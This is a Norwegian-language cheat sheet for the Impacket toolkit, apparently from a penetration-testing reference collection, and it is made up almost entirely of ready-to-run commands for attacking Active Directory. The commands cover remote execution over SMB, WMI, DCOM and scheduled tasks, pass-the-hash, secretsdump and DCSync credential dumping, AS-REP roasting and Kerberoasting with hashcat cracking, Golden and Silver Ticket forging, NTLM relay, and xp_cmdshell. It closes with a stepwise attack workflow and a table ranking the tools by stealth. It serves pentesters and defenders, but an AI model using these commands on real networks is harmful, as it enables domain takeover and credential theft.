# 🐍 Impacket – Python-verktøykasse for AD-angrep

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Presisering:** Fjernkjøring og uthenting av hemmeligheter krever tilgang og rettigheter til den aktuelle tjenesten; et gyldig domenepassord gir ikke automatisk administratorrettigheter. DCSync replikerer katalogdata og krever relevante replikeringsrettigheter; det er ikke en rå kopi av hele databasefilen. [Microsoft: replikeringsrettighet](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all).
>
> **Eksempelmerknad:** `-target-ip` velger målets IP-adresse, selv om kommentaren nedenfor omtaler en bestemt deling. Tabellen med diskresjonsnivåer er en grov sammenligning, ingen garanti. Skriptnavn, pakkeprefikser og alternativer kan variere med installasjon og versjon. [Impackets psexec-kilde](https://github.com/fortra/impacket/blob/master/examples/psexec.py), [offisielle eksempler](https://github.com/fortra/impacket/tree/master/examples).

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Python-verktøykasse for nettverksprotokoller
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er Impacket](#-hva-er-impacket)
- [Installasjon](#-installasjon)
- [Fjernkjøring](#-fjernkjøring)
- [Uthenting av legitimasjon](#-uthenting-av-legitimasjon)
- [Kerberos-angrep](#-kerberos-angrep)
- [SMB-angrep](#-smb-angrep)
- [MSSQL-angrep](#-mssql-angrep)
- [LDAP-/AD-spørringer](#-ldap-ad-spørringer)
- [Hurtigreferanse](#-hurtigreferanse)
- [Ressurser](#-ressurser)

---

## 🎯 Hva er Impacket

**Impacket** er en samling Python-klasser for arbeid med nettverksprotokoller. Sentralt for AD-angrep:

- 🎫 **Kerberos** – AS-REP/Kerberoasting og billettangrep
- 💻 **Fjernkjøring** – psexec, wmiexec, smbexec og atexec
- 🔓 **Uthenting av legitimasjon** – secretsdump og DCSync
- 📁 **SMB** – Filoperasjoner og relay
- 🗄️ **MSSQL** – Databaseangrep

### Viktige verktøy

| Verktøy | Beskrivelse |
|------|-------------|
| **psexec.py** | Fjernkjøring via SMB |
| **wmiexec.py** | Fjernkjøring via WMI |
| **secretsdump.py** | Hent ut legitimasjon/hasher |
| **GetNPUsers.py** | AS-REP roasting |
| **GetUserSPNs.py** | Kerberoasting |
| **ntlmrelayx.py** | NTLM relay-angrep |
| **smbclient.py** | SMB-klient |
| **mssqlclient.py** | MSSQL-klient |

---

## 🚀 Installasjon

### Kali Linux

```bash
# Forhåndsinstallert i Kali
impacket-psexec --help

# Eller installer/oppdater
pip3 install impacket
pip3 install impacket --upgrade
```

### Fra GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Eller installer for utvikling
pip3 install -e .
```

### Verifiser

```bash
# Kontroller installasjonen
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

## 💻 Fjernkjøring

### psexec.py

```bash
# Med passord
impacket-psexec domain.local/user:password@10.10.10.10

# Med NTLM-hash (Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Lokal administrator
impacket-psexec administrator:password@10.10.10.10

# Kjør kommando
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Velg en bestemt deling
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

### wmiexec.py

```bash
# Mer diskret enn psexec
impacket-wmiexec domain.local/user:password@10.10.10.10

# Med hash
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Kjør kommando
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# Ingen utdata (stille)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# Bruker SMB til kjøring
impacket-smbexec domain.local/user:password@10.10.10.10

# Med hash
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Angi deling
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# Bruker oppgaveplanleggeren
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# Med hash
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# Bruker DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Forskjellige DCOM-objekter
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

## 🔓 Uthenting av legitimasjon

### secretsdump.py

```bash
# Hent ut fra ekstern vert
impacket-secretsdump domain.local/user:password@10.10.10.10

# Hent ut med hash (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Hent ut fra domenekontroller (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# DCSync for bare én bestemt bruker
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Bare NTLM-hasher (ingen Kerberos-nøkler)
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Skriv til fil
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### DCSync-angrep

```bash
# Full DCSync (henter ut hele AD-databasen)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync for bestemt bruker
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync for krbtgt (for Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Utdataformat: user:RID:LM:NTLM:::
```

### Fra lokale filer

```bash
# Fra NTDS.dit + SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Fra SAM + SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Fra SECURITY + SYSTEM (LSA-hemmeligheter)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

## 🎫 Kerberos-angrep

### AS-REP roasting (GetNPUsers.py)

```bash
# Finn brukere uten forhåndsautentisering
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# Med legitimasjon
impacket-GetNPUsers domain.local/user:password -request

# Domenekontrollerens IP angitt
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Skriv til fil
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Format for hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Format for john
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting (GetUserSPNs.py)

```bash
# Finn brukere utsatt for Kerberoasting
impacket-GetUserSPNs domain.local/user:password

# Be om TGS-billetter
impacket-GetUserSPNs domain.local/user:password -request

# Skriv til fil
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# Domenekontrollerens IP
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# Med hash
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### Knekking av Kerberos-hasher

```bash
# AS-REP (hashcat-modus 18200)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (hashcat-modus 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# Med john
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### getTGT.py

```bash
# Be om TGT med passord
impacket-getTGT domain.local/user:password

# Be om TGT med hash
impacket-getTGT domain.local/user -hashes :NTLMHASH

# Be om TGT med AES-nøkkel
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Lagres i user.ccache
# Eksporter for bruk:
export KRB5CCNAME=user.ccache
```

### ticketer.py (Golden/Silver Ticket)

```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Bruk billetten
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

## 📁 SMB-angrep

### smbclient.py

```bash
# Koble til deling
impacket-smbclient domain.local/user:password@10.10.10.10

# List delinger
# (inne i smbclient)
shares

# Koble til bestemt deling
use SHARE_NAME

# List filer
ls

# Last ned fil
get filename

# Last opp fil
put localfile

# Kjør kommando
# (hvis du har skrivetilgang til en deling)
```

### smbserver.py

```bash
# Start SMB-server (for eksfiltrering)
impacket-smbserver share /tmp/share

# Med autentisering
impacket-smbserver share /tmp/share -username user -password pass

# SMB2-støtte
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

```bash
# Grunnleggende relay
impacket-ntlmrelayx -tf targets.txt

# Relay til SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay og kjør kommando
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Hent ut SAM ved relay
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Relay til LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# Med Responder:
# 1. Rediger Responder.conf, og sett SMB = Off, HTTP = Off
# 2. Kjør: responder -I eth0
# 3. Kjør: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

<a id="-mssql-angrep"></a>
## 🗄️ MSSQL-angrep

### mssqlclient.py

```bash
# Koble til med Windows-autentisering
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Koble til med SQL-autentisering
impacket-mssqlclient sa:password@10.10.10.10

# Med hash
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Koble til bestemt database
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### MSSQL-kommandoer

```sql
-- Aktiver xp_cmdshell
enable_xp_cmdshell

-- Kjør kommando
xp_cmdshell whoami

-- SQL-spørring
SELECT * FROM master.sys.databases

-- Les fil
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

## 📂 LDAP-/AD-spørringer

### GetADUsers.py

```bash
# List alle brukere
impacket-GetADUsers domain.local/user:password -all

# Bestemt domenekontroller
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# Med hash
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# Kartlegg brukere ved å prøve SID-er systematisk
impacket-lookupsid domain.local/user:password@10.10.10.10

# Angi SID-intervall
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# Finn delegeringsinnstillinger
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

## 📊 Hurtigreferanse

### Autentiseringsalternativer

| Alternativ | Beskrivelse |
|--------|-------------|
| `user:password` | Passordautentisering |
| `-hashes :NTLM` | NTLM-hash (Pass-the-Hash) |
| `-hashes LM:NTLM` | LM:NTLM-hash |
| `-aesKey KEY` | AES256-nøkkel |
| `-k -no-pass` | Kerberos med ccache |

### Vanlige alternativer

| Alternativ | Beskrivelse |
|--------|-------------|
| `-dc-ip IP` | Domenekontrollerens IP |
| `-target-ip IP` | Målets IP |
| `-debug` | Aktiver feilsøkingsutdata |

### Oversikt over fjernkjøring

| Verktøy | Metode | Diskresjon |
|------|--------|---------|
| psexec.py | SMB + tjeneste | Lav |
| wmiexec.py | WMI | Middels |
| smbexec.py | SMB | Lav |
| atexec.py | Oppgaveplanlegger | Høy |
| dcomexec.py | DCOM | Middels |

### Angrepsarbeidsflyt

```bash
# 1. Kartlegg brukere (AS-REP Roast)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Kerberoast
impacket-GetUserSPNs domain.local/user:password -request

# 3. Knekk hasher
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. PtH eller bruk passord
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Hent ut legitimasjon
impacket-secretsdump domain.local/admin:password@DC01

# 6. DCSync for alle hasher
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

## 📚 Ressurser

- [Impacket GitHub](https://github.com/fortra/impacket)
- [Impacket-eksempler](https://github.com/fortra/impacket/tree/master/examples)
- [Wiki](https://github.com/fortra/impacket/wiki)

### Relaterte hurtigreferanser
- [BloodHound](../../BloodHound/translations/README.nb.md)
- [Mimikatz](../../Mimikatz/translations/README.nb.md)
- [Hashcat](../../Hashcat/translations/README.nb.md)

---

<p align="center">
  <b>🐍 Behersk AD-angrep med Python!</b><br>
  <i>Impacket – pentesterens sentrale verktøykasse</i>
</p>
